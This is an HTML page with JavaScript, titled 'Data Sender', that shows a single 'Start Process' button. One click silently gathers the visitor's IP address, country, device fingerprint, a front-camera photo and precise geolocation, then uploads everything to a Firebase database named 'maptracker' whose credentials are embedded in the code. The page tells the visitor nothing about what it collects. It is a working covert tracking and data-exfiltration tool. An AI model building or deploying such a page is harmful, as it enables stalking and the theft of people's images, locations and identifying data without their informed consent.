<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Sender</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        h1 {
            color: #00ff00;
            margin-top: 20px;
        }
        #loading-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            color: #ffffff;
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        #loading-message {
            font-size: 24px;
            font-weight: bold;
        }
        .container {
            margin: 20px auto;
            max-width: 400px;
        }
        .button {
            background-color: #00cc00;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s;
            width: 100%;
        }
        .button:hover {
            background-color: #009900;
        }
        .error-message {
            color: #ff0000;
            margin: 10px 0;
        }
        .info-message {
            color: #ffff00;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div id="loading-screen">
        <div id="loading-message">
            <i class="fas fa-spinner fa-spin"></i> Processing, please wait...
        </div>
    </div>
    <div class="container">
        <h1>Data Sender</h1>
        <button class="button" id="start-button">Start Process</button>
        <div id="error-message" class="error-message"></div>
        <div id="info-message" class="info-message"></div>
    </div>

    <script type="module">
        const firebaseConfig = {
            apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4", // Your API Key
            authDomain: "maptracker-7afb6.firebaseapp.com", // Your Auth Domain
            databaseURL: "https://maptracker-7afb6-default-rtdb.firebaseio.com", // Your Database URL
            projectId: "maptracker-7afb6", // Your Project ID
            storageBucket: "maptracker-7afb6.appspot.com", // Your Storage Bucket
            messagingSenderId: "874600101063", // Your Messaging Sender ID
            appId: "1:874600101063:web:79d8010dee2bf0e57f7ae2", // Your App ID
            measurementId: "G-HTXZEYZ3DK" // Your Measurement ID
        };

        const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
        const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        const loadingScreen = document.getElementById('loading-screen');
        const errorMessage = document.getElementById('error-message');
        const infoMessage = document.getElementById('info-message');

        document.getElementById('start-button').addEventListener('click', startProcess);

        // Main function to handle data sending
        async function startProcess() {
            errorMessage.innerHTML = '';
            infoMessage.innerHTML = '';
            loadingScreen.style.display = 'flex'; // Show loading screen

            let sessionId = Date.now(); // Unique session ID
            let sessionData = {};

            try {
                // Step 1: Get IP Address and country
                const { ip, country } = await getIpAndCountry();
                sessionData.ipAddress = ip;
                sessionData.country = country;
                console.log('IP and Country Retrieved:', ip, country);

                // Step 2: Get Device Info including Timezone and Language
                const deviceInfo = await getDeviceInfo();
                sessionData = { ...sessionData, ...deviceInfo }; // Merge device info into sessionData
                console.log('Device Info Retrieved:', deviceInfo);

                // Step 3: Take Screenshot
                const screenshot = await takeScreenshot();
                sessionData.screenshot = screenshot;
                console.log('Screenshot Captured');

                // Step 4: Get Geolocation (optional, may be denied)
                const position = await getGeolocation();
                sessionData.latitude = position.coords.latitude;
                sessionData.longitude = position.coords.longitude;
                console.log('Geolocation Retrieved:', position.coords);

                // Step 5: Upload all data to Firebase
                await uploadSessionData(sessionId, sessionData);
                infoMessage.innerHTML = 'Data successfully uploaded!';
                console.log('Data successfully uploaded:', sessionData);
            } catch (error) {
                errorMessage.innerHTML = error.message;
                console.error('Error during process:', error);
            } finally {
                loadingScreen.style.display = 'none'; // Hide loading screen
            }
        }

        // Function to get IP Address and country
        async function getIpAndCountry() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name
                };
            } catch (error) {
                throw new Error('Failed to retrieve IP address and country.');
            }
        }

        // Function to get device information, including timezone and language
        async function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                deviceMemory: navigator.deviceMemory || 'N/A',
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                screenResolution: `${window.screen.width} x ${window.screen.height}`,
                language: navigator.language || 'en-US',
                platform: navigator.platform || 'N/A',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // Timezone info
            };
        }

        // Function to take a screenshot using the front camera
        async function takeScreenshot() {
            const video = document.createElement('video');
            video.autoplay = true;

            try {
                // Use the front camera on mobile devices
                video.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            } catch (error) {
                throw new Error("Unable to access the camera. Please allow camera access and try again.");
            }

            document.body.appendChild(video);

            return new Promise((resolve) => {
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    video.srcObject.getTracks().forEach(track => track.stop());
                    document.body.removeChild(video);
                    resolve(canvas.toDataURL('image/png'));
                }, 1000);
            });
        }

        // Function to get geolocation
        async function getGeolocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(resolve, (error) => {
                        reject(new Error('Geolocation access denied.'));
                    });
                } else {
                    reject(new Error('Geolocation not supported.'));
                }
            });
        }

        // Function to upload data to Firebase
        async function uploadSessionData(sessionId, sessionData) {
            const dataRef = ref(database, 'sessions/' + sessionId);
            await set(dataRef, sessionData);
        }
    </script>
</body>
</html>
